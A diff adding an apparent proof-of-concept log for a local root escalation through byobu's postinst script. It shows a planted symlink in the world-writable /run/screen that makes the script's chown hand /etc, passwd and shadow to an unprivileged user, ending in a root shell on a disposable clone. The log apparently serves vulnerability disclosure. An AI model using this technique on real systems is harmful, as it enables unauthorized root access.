@@ -1,0 +1,149 @@
+## live target default proof and non-destructive trigger gates
+PRETTY_NAME="Ubuntu 24.04.4 LTS"
+NAME="Ubuntu"
+VERSION_ID="24.04"
+VERSION="24.04.4 LTS (Noble Numbat)"
+VERSION_CODENAME=noble
+ID=ubuntu
+ID_LIKE=debian
+HOME_URL="https://www.ubuntu.com/"
+Linux bf51bb670420 6.10.14-linuxkit #1 SMP Sat May 17 08:28:57 UTC 2025 aarch64 aarch64 aarch64 GNU/Linux
+uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
+apt	2.8.3	ii 
+byobu	6.11-0ubuntu1	ii 
+debconf	1.5.86ubuntu1	ii 
+screen	4.9.1-1ubuntu1	ii 
+unattended-upgrades	2.9.1+nmu4ubuntu1	ii 
+enabled
+enabled
+active
+active
+Reading package lists...
+Building dependency tree...
+Reading state information...
+Calculating upgrade...
+0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.
+drwxrwxrwt 1777 root:utmp directory /run/screen
+-rw-r--r-- 644 root:root regular file /etc/byobu/socketdir
+-rwxr-xr-x 755 root:root regular file /var/lib/dpkg/info/byobu.postinst
+drwxr-xr-x 755 root:root directory /etc
+drwx------ 700 root:root directory /root
+### /etc/byobu/socketdir
+# Set the location of the socket directory that byobu will use.
+# On Debian/Ubuntu systems, this is in /var/run/screen, but on
+# other distros, it might be elsewhere, such as /tmp/screens
+# depending on your compilation.
+#
+# This file will be sourced by both shell scripts and python code,
+# so please ensure that:
+#  * the variable name is SOCKETDIR
+#  * there is no space around the "="
+#  * and that the path value is quoted
+SOCKETDIR="/var/run/screen"
+### /var/lib/dpkg/info/byobu.postinst
+     1	#!/bin/sh -e
+     2	
+     3	. /usr/share/debconf/confmodule
+     4	db_version 2.0
+     5	
+     6	PKG="byobu"
+     7	
+     8	db_get byobu/launch-by-default || true
+     9	if [ "$RET" = true ]; then
+    10		touch /etc/$PKG/autolaunch
+    11	else
+    12		rm -f /etc/$PKG/autolaunch
+    13	fi
+    14	
+    15	# Install correct .desktop file
+    16	if [ -x /usr/lib/gnome-terminal/gnome-terminal-server ]; then
+    17		ln -sf /usr/share/$PKG/desktop/$PKG.desktop /usr/share/applications/$PKG.desktop
+    18	else
+    19		ln -sf /usr/share/$PKG/desktop/$PKG.desktop.old /usr/share/applications/$PKG.desktop
+    20	fi
+    21	
+    22	# Clean up any old-school screen-profiles diversions of /usr/bin/screen
+    23	if [ -f /usr/bin/screen ] && [ -f /usr/bin/screen.real ]; then
+    24		divertpkg=$(dpkg-divert --listpackage /usr/bin/screen || true)
+    25		if [ "$divertpkg" = "screen-profiles" ]; then
+    26			rm -f /usr/bin/screen
+    27			dpkg-divert --package screen-profiles --rename --remove /usr/bin/screen
+    28		fi
+    29	fi
+    30	
+    31	# Remove the short-lived MOTD message
+    32	rm -f /etc/update-motd.d/55-window-manager
+    33	
+    34	# Attempt to notify users that they should reload their profile
+    35	touch_flag() {
+    36		touch "$1" || true
+    37		chown --reference $(dirname "$1") "$1" || true
+    38		chmod 700 "$1" || true
+    39	}
+    40	[ -r "/etc/$PKG/socketdir" ] && . "/etc/$PKG/socketdir"
+    41	if [ -d "$SOCKETDIR" ]; then
+    42		for d in "$SOCKETDIR"/S-*; do
+    43			if [ -d "$d/$PKG" ]; then
+    44				# New location of the reload flag
+    45				touch_flag "$d/$PKG/reload-required"
+    46			elif [ -d "$d" ]; then
+    47				# Old location of the reload flag
+    48				touch_flag "$d/$PKG.reload-required"
+    49			fi
+    50		done
+    51	fi
+    52	
+    53	# Clean-up obsolete config file
+    54	rm -f /etc/byobu/statusrc || true
+    55	
+    56	
+    57	# Automatically added by dh_python3
+    58	if command -v py3compile >/dev/null 2>&1; then
+    59		py3compile -p byobu /usr/lib/byobu
+    60	fi
+    61	if command -v pypy3compile >/dev/null 2>&1; then
+    62		pypy3compile -p byobu /usr/lib/byobu || true
+    63	fi
+    64	
+    65	# End automatically added section
+    66	# Automatically added by dh_icons/13.13ubuntu1
+    67	if [ "$1" = "configure" ] || [ "$1" = "abort-upgrade" ] || [ "$1" = "abort-deconfigure" ] || [ "$1" = "abort-remove" ] ; then
+    68		if command -v update-icon-caches >/dev/null; then
+    69			update-icon-caches /usr/share/icons/HighContrast
+    70		fi
+    71	fi
+    72	# End automatically added section
+    73	
+    74	
+    75	# vi: syntax=sh ts=4 noexpandtab
+uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
+drwxr-xr-x attacker:attacker /run/screen/S-byoburef
+drwxr-xr-x attacker:attacker /run/screen/S-byoburef etc
+dpkg: error: requested operation requires superuser privilege
+dpkg_configure_rc=2
+mkdir: cannot create directory '/run/needrestart': Permission denied
+/usr/sbin/dpkg-reconfigure must be run as root
+dpkg_reconfigure_rc=1
+Failed to start apt-daily-upgrade.service: Interactive authentication required.
+See system logs and 'systemctl status apt-daily-upgrade.service' for details.
+systemctl_apt_daily_rc=1
+LIVE_ETC_AFTER drwxr-xr-x root:root /etc
+
+## disposable clone full-impact proof after manual root postinst trigger
+CLONE_TARGET PRETTY_NAME="Ubuntu 24.04.4 LTS"
+byobu	6.11-0ubuntu1	ii 
+screen	4.9.1-1ubuntu1	ii 
+BEFORE_ETC drwxr-xr-x root:root /etc
+drwxr-xr-x attacker:attacker /run/screen/S-byoburef
+drwxr-xr-x attacker:attacker /run/screen/S-byoburef etc
+### manual root maintainer-script trigger
+postinst_rc=0
+AFTER_ETC drwxr-xr-x attacker:attacker /etc
+-rw-r--r-- 1 attacker attacker 117 May 17 17:38 /etc/passwd
+-rw-r----- 1 attacker attacker 182 May 17 17:38 /etc/shadow
+### root proof from uid1001 after /etc ownership change
+bash: /root/.bash_profile: Permission denied
+uid=1001(attacker) gid=1001(attacker) groups=1001(attacker)
+Password: uid=0(root) gid=0(root) groups=0(root)
+ROOT_PROOF
+-rw-r--r-- 1 root root 0 May 17 17:38 /root/byobu_postinst_screen_chown_root
